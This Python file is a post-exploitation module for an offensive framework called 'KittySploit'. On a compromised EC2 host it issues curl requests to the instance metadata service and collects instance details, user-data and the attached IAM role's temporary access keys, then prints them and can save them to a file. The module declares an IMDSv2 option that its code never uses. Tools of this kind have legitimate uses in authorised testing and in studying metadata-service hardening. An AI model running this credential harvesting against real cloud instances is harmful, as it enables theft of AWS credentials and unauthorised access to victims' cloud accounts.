#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS EC2 Metadata Enumeration Module
Author: KittySploit Team
Version: 1.0.0

This module retrieves metadata from EC2 Instance Metadata Service (IMDS).
"""

from kittysploit import *
import json
from core.output_handler import print_info, print_success, print_error, print_warning

class Module(Post):
    """Enumerate EC2 Instance Metadata Service"""
    
    __info__ = {
        "name": "Enumerate EC2 Metadata",
        "description": "Retrieve metadata from EC2 Instance Metadata Service (IMDS)",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.AWS,
    }
    
    imds_version = OptChoice("v1", "IMDS version (v1 or v2)", False, ["v1", "v2"])
    get_credentials = OptBool(True, "Retrieve IAM role credentials", False)
    get_user_data = OptBool(True, "Retrieve user-data", False)
    get_all_metadata = OptBool(False, "Retrieve all available metadata (can be verbose)", False)
    output_file = OptString("", "Output file to save metadata (JSON format)", False)
    
    def run(self):
        """Run the EC2 metadata enumeration"""
        try:
            results = {}
            
            print_info("Starting EC2 metadata enumeration...")
            print_info("=" * 80)
            
            # Check if we're on EC2
            print_info("\n[1] Checking if running on EC2...")
            is_ec2 = self._check_ec2()
            if not is_ec2:
                print_warning("Not running on EC2 or IMDS not accessible")
                return False
            
            print_success("Running on EC2 instance")
            results['is_ec2'] = True
            
            # Get basic metadata
            print_info("\n[2] Retrieving basic instance metadata...")
            basic_metadata = self._get_basic_metadata()
            if basic_metadata:
                results['basic_metadata'] = basic_metadata
                print_success("Retrieved basic metadata")
                for key, value in basic_metadata.items():
                    print_info(f"  {key}: {value}")
            
            # Get IAM role credentials
            if self.get_credentials.value:
                print_info("\n[3] Retrieving IAM role credentials...")
                credentials = self._get_iam_credentials()
                if credentials:
                    results['iam_credentials'] = credentials
                    print_success("Retrieved IAM role credentials")
                    print_info(f"  Role: {credentials.get('RoleName', 'Unknown')}")
                    print_info(f"  Access Key ID: {credentials.get('AccessKeyId', 'Unknown')[:10]}...")
                    print_warning("  ⚠️  Credentials retrieved - use with caution!")
                else:
                    print_info("No IAM role attached or access denied")
            
            # Get user-data
            if self.get_user_data.value:
                print_info("\n[4] Retrieving user-data...")
                user_data = self._get_user_data()
                if user_data:
                    results['user_data'] = user_data
                    print_success("Retrieved user-data")
                    print_info(f"  Length: {len(user_data)} bytes")
                    # Show first 500 chars
                    preview = user_data[:500]
                    print_info(f"  Preview:\n{preview}")
                    if len(user_data) > 500:
                        print_info("  ... (truncated)")
                else:
                    print_info("No user-data found")
            
            # Get all metadata
            if self.get_all_metadata.value:
                print_info("\n[5] Retrieving all available metadata...")
                all_metadata = self._get_all_metadata()
                if all_metadata:
                    results['all_metadata'] = all_metadata
                    print_success("Retrieved all metadata")
            
            # Summary
            print_info("\n" + "=" * 80)
            print_info("ENUMERATION SUMMARY")
            print_info("=" * 80)
            print_success("Metadata retrieved successfully")
            
            if results.get('iam_credentials'):
                print_warning("⚠️  IAM credentials found - these can be used to access AWS services")
            
            # Save to file if requested
            if self.output_file.value:
                try:
                    with open(self.output_file.value, 'w') as f:
                        json.dump(results, f, indent=2, default=str)
                    print_success(f"Metadata saved to {self.output_file.value}")
                except Exception as e:
                    print_error(f"Failed to save metadata: {e}")
            
            return True
            
        except Exception as e:
            print_error(f"Error during enumeration: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _check_ec2(self):
        """Check if running on EC2"""
        imds_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://[fd00:ec2::254]/latest/meta-data/'  # IPv6
        ]
        
        for endpoint in imds_endpoints:
            cmd = f"curl -s --connect-timeout 2 {endpoint} 2>/dev/null | head -1"
            result = self.cmd_execute(cmd)
            if result and result.strip():
                return True
        return False
    
    def _get_basic_metadata(self):
        """Get basic instance metadata"""
        metadata_items = {
            'instance-id': 'instance-id',
            'instance-type': 'instance-type',
            'ami-id': 'ami-id',
            'region': 'placement/region',
            'availability-zone': 'placement/availability-zone',
            'hostname': 'hostname',
            'public-ipv4': 'public-ipv4',
            'local-ipv4': 'local-ipv4',
            'mac': 'mac',
            'security-groups': 'security-groups'
        }
        
        metadata = {}
        base_url = 'http://169.254.169.254/latest/meta-data/'
        
        for key, path in metadata_items.items():
            cmd = f"curl -s --connect-timeout 2 {base_url}{path} 2>/dev/null"
            result = self.cmd_execute(cmd)
            if result and result.strip():
                metadata[key] = result.strip()
        
        return metadata if metadata else None
    
    def _get_iam_credentials(self):
        """Get IAM role credentials from IMDS"""
        base_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        
        # First, get role name
        cmd = f"curl -s --connect-timeout 2 {base_url} 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if not result or not result.strip():
            return None
        
        role_name = result.strip().split('\n')[0]
        if not role_name:
            return None
        
        # Get credentials for the role
        creds_url = f"{base_url}{role_name}"
        cmd = f"curl -s --connect-timeout 2 {creds_url} 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                creds = json.loads(result)
                creds['RoleName'] = role_name
                return creds
            except:
                pass
        
        return None
    
    def _get_user_data(self):
        """Get user-data"""
        cmd = "curl -s --connect-timeout 2 http://169.254.169.254/latest/user-data 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result and result.strip():
            return result
        return None
    
    def _get_all_metadata(self):
        """Get all available metadata"""
        base_url = 'http://169.254.169.254/latest/meta-data/'
        
        # Get all metadata paths recursively
        cmd = f"curl -s --connect-timeout 2 {base_url} 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if not result:
            return None
        
        metadata = {}
        paths = [line.strip() for line in result.split('\n') if line.strip()]
        
        for path in paths:
            if path.endswith('/'):
                # Directory, skip for now
                continue
            
            cmd = f"curl -s --connect-timeout 2 {base_url}{path} 2>/dev/null"
            value = self.cmd_execute(cmd)
            if value:
                metadata[path] = value.strip()
        
        return metadata if metadata else None


